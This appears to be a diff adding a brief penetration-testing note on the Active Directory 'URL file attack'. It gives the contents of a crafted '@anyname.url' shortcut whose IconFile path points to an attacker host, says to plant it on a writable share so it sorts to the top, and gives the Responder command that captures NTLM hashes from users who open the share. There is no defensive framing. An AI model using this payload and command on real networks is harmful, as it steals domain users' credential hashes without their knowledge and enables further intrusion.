@@ -1,1 +1,12 @@
+Url File Attacks
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
 
+In this attack we create a url file ,pointing towards our ip address and then upload this file to a writable share with a appropriate name starting with @ or - so that the file is on top when any user access that share. We run responder on our machine and then wait for any user to open the file and we can grab the hash just like we did before. This requires access to any domain machine
+
+    create a file with following text and name it like "@anyname.url"
+
+[InternetShortcut] URL=blah WorkingDirectory=blah IconFile=\AttackerIP%USERNAME%.icon IconIndex=1
+
+    Now we run responder and wait for the file to be opened
+
+    responder -I eth0 -rdw
